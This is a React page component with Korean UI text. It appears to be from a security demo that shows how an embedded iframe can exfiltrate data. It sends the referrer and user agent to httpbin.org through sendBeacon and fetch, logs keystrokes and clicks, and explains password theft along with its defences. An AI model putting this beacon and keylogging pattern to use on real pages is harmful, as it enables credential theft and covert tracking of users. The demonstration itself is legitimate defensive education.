"use client";

import { useEffect, useState } from "react";
import { findScenario } from "@/lib/scenarios";
import { ScenarioHeader } from "@/app/ScenarioHeader";
import { EmbedSnippet } from "@/app/EmbedSnippet";
import { Log, useLog } from "@/app/Log";

const EXFIL_ENDPOINT = "https://httpbin.org/post";

const BeaconExfilPage = () => {
  const scenario = findScenario("beacon-exfil")!;
  const { lines, push, clear } = useLog();
  const [tracking, setTracking] = useState(false);

  useEffect(() => {
    if (!tracking) return;
    const onClick = (e: MouseEvent) => {
      push(`click 좌표 수집: x=${e.clientX} y=${e.clientY}`);
    };
    const onKey = (e: KeyboardEvent) => {
      push(`key 수집: "${e.key}" (실제 공격이라면 비밀번호도 그대로 수집)`);
    };
    window.addEventListener("click", onClick);
    window.addEventListener("keydown", onKey);
    return () => {
      window.removeEventListener("click", onClick);
      window.removeEventListener("keydown", onKey);
    };
  }, [tracking, push]);

  const sendBeacon = () => {
    const payload = {
      ts: Date.now(),
      referrer: document.referrer,
      ua: navigator.userAgent,
      lang: navigator.language,
      // parent origin 은 cross-origin 이면 직접 못 읽지만, document.referrer 로 추정 가능
    };
    push(`navigator.sendBeacon("${EXFIL_ENDPOINT}", ...)`);
    const ok = navigator.sendBeacon(
      EXFIL_ENDPOINT,
      new Blob([JSON.stringify(payload)], { type: "application/json" })
    );
    push(`결과: ${ok ? "전송 큐 들어감" : "실패"}`);
  };

  const sendFetch = async () => {
    push(`fetch POST → ${EXFIL_ENDPOINT}`);
    try {
      const res = await fetch(EXFIL_ENDPOINT, {
        method: "POST",
        mode: "cors",
        body: JSON.stringify({
          referrer: document.referrer,
          ua: navigator.userAgent,
          ts: Date.now(),
        }),
      });
      push(`응답 status=${res.status}`);
    } catch (e) {
      push(`실패: ${(e as Error).message}`);
    }
  };

  return (
    <>
      <ScenarioHeader scenario={scenario} />
      <EmbedSnippet slug="beacon-exfil" />

      <h2>실행</h2>
      <div className="kv">
        <div className="k">document.referrer</div>
        <div>
          <code>{typeof window === "undefined" ? "-" : document.referrer || "(없음)"}</code>
        </div>
        <div className="k">navigator.userAgent</div>
        <div>
          <code>{typeof window === "undefined" ? "-" : navigator.userAgent}</code>
        </div>
      </div>
      <div className="actions">
        <button className="danger" onClick={sendBeacon}>
          sendBeacon 으로 전송
        </button>
        <button className="danger" onClick={sendFetch}>
          fetch 로 전송
        </button>
        <button
          className={tracking ? "danger" : ""}
          onClick={() => setTracking((t) => !t)}
        >
          {tracking ? "키/클릭 수집 끄기" : "키/클릭 수집 켜기"}
        </button>
        <button onClick={clear}>로그 초기화</button>
      </div>
      <Log lines={lines} />

      <h2>해설</h2>
      <ul>
        <li>
          iframe 안에서 일어난 클릭/키 입력은 자기 origin 이라 자유롭게 수집할 수
          있습니다. iframe 위에 가짜 입력 필드를 두면 사용자가 거기 친 비밀번호
          그대로 attacker 서버로 보낼 수 있습니다.
        </li>
        <li>
          <code>document.referrer</code> 로 부모 페이지 URL 의 origin / path 까지
          확인 가능합니다 (Referrer-Policy 에 따라 다름). 알렌 페이지에서 어느
          노트에 임베드됐는지 추적 가능.
        </li>
        <li>
          이 공격은 진짜 데이터 탈취에 가장 가깝습니다. 대응은 sandbox 빈 값으로
          JS 자체를 막거나 호스트 화이트리스트로 신뢰 도메인만 허용하는 것.
        </li>
      </ul>
    </>
  );
};

export default BeaconExfilPage;
